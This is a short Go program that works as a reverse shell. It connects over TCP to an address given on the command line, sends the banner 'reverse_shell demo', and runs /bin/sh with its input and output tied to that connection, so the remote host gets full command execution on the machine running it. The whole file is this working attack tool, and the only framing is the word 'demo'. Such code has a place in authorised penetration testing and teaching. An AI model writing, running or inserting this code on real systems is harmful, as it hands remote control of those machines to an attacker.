package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
)

var (
	shell    = "/bin/sh"
	remoteIp string
)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: " + os.Args[0] + " <remoteAddress>")
		os.Exit(1)
	}
	remoteIp = os.Args[1]
	remoteConn, err := net.Dial("tcp", remoteIp)
	if err != nil {
		log.Fatal("connecting err: ", err)
	}

	_, _ = remoteConn.Write([]byte("reverse_shell demo"))

	command := exec.Command(shell)
	command.Env = os.Environ()
	command.Stdin = remoteConn
	command.Stdout = remoteConn
	command.Stderr = remoteConn
	_ = command.Run()
}
